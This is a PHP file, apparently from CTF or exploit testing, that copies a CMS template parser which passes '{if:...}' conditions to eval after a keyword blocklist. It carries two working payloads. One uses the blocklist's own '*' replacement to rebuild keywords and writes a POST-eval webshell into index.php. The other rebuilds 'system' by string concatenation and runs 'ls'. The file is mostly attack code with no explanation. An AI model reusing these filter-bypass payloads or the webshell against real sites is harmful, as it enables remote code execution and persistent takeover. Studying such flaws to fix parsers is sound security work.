<?php
// highlight_file(__FILE__);

$x = "{if:1) file_put_contents(str_replace('*','','index.pgethp'),str_replace('*','','<?pphphphp evevalal(ggetet_defined_vars()[_PPOSTOST][1]);'));//}{end if}";

$x = "{if:1)('sy'.('st').'em')('ls');;//}{end if}";
parseIfLabel($x);
function filterDangerousKeywords($s)
{
    echo $s . '\n\n';
    // $s = htmlspecialchars($s);
    $dangerousKeywords = array('php', 'preg', 'server', 'chr', 'decode', 'html', 'md5', 'post', 'get', 'request', 'file', 'cookie', 'session', 'sql', 'mkdir', 'copy', 'fwrite', 'del', 'encrypt', '$', 'system', 'exec', 'shell', 'open', 'ini_', 'chroot', 'eval', 'passthru', 'include', 'require', 'assert', 'union', 'create', 'func', 'symlink', 'sleep', 'ord', 'str', 'source', 'rev', 'base_convert', 'systemctl', 'sudo', 'chmod', 'chown', 'iptables', 'netstat', 'ifconfig', 'adduser', 'useradd', 'usermod', 'groupadd', 'groupmod', 'passwd', 'flag');
    $s = str_ireplace($dangerousKeywords, "*", $s);
    if (preg_match("/^[a-z]$/i", $s)) {
        echo "here dying";
        die ('Sorry, execution error occurred, dangerous character found');
    }
    return $s;
}

function parseIfLabel($content)
{
    $pattern = '/\{if:([\s\S]+?)}([\s\S]*?){end\s+if}/';
    if (preg_match_all($pattern, $content, $matches)) {
        foreach ($matches[0] as $key => $ifLabel) {

            $flag = '';
            $outputHtml = '';
            $ifCondition = filterDangerousKeywords($matches[1][$key]);
            // echo $ifCondition . '\n\n';
            $ifCondition = str_replace(array('<>', 'or', 'and', 'mod', 'not'), array('!=', '||', '&&', '%', '!'), $ifCondition);

            echo 'if(' . $ifCondition . '){$flag="if";}else{$flag="else";}' . '\n\n-------------------\n\n';

            @eval ('if(' . $ifCondition . '){$flag="if";}else{$flag="else";}');
            if (preg_match('/([\s\S]*)?\{else\}([\s\S]*)?/', $matches[2][$key], $matches2)) {
                switch ($flag) {
                    case 'if':
                        $outputHtml .= isset ($matches2[1]) ? $matches2[1] : '';
                        break;
                    case 'else':
                        $outputHtml .= isset ($matches2[2]) ? $matches2[2] : '';
                        break;
                }
            } elseif ($flag == 'if') {
                $outputHtml .= $matches[2][$key];
            }
            $content = str_replace($ifLabel, $outputHtml, $content);
        }
    }

    return $content;
}

function splitString($s, $delimiter = ',')
{
    return empty ($s) ? array('') : explode($delimiter, $s);
}
?>